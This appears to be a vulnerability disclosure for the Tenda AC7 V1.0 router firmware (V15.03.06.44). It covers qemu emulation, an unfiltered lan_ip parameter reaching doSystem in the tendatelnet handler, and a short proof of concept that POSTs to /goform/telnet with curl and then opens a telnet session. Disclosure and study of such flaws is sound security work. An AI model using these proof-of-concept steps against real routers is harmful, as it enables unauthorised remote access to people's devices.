Overview
--
Experimental environment：ub20

Firmware download website：[AC7 V1.0 升级软件](https://www.tenda.com.cn/material/show/102776)
![image](https://github.com/user-attachments/assets/c15fa54c-802a-45a4-aa5f-18607632f90b)

### Environmental simulation

Directly using the httpd in the original firmware will cause the simulation to fail due to the environment check. Here is the patched httpd file (a7__V15.03.06.44_httpd_ok file in this project) (modify the assembly to force skip the environment check step):

qemu command：

```text-x-haskell
sudo qemu-mipsel-static -L . ./bin/httpd
```

Attacked version
-----

V15.03.06.44

Vulnerability Details
----

**An issue was found in the Tenda AC7 V1.0\_V15.03.06.44 device: the tendatelnet function processes the request in http, does not properly process the parameter lan\_ip, and is directly connected to the doSystem system-level function. This may lead to a command injection vulnerability and may also cause shell metacharacters to be activated. For example, an attacker may use telnet to remotely access the attacked device.**

![image](https://github.com/user-attachments/assets/560f7ed3-c51b-4052-8b54-d9d149461896)


Cross-references reveal that the parent function that calls this function is telnet, and the first-level directory name is goform.


![image](https://github.com/user-attachments/assets/bafe875a-a234-4c27-900f-dc2832326e77)


Proof of Concept
----

```text-x-haskell
curl -i -X POST http://192.168.142.100/goform/telnet -d Raining=Raining --cookie "user=admin" --http0.9
telnet 192.168.142.100 80
```
![image](https://github.com/user-attachments/assets/91ef600d-65a3-4d16-9cd5-965644cdfc3b)
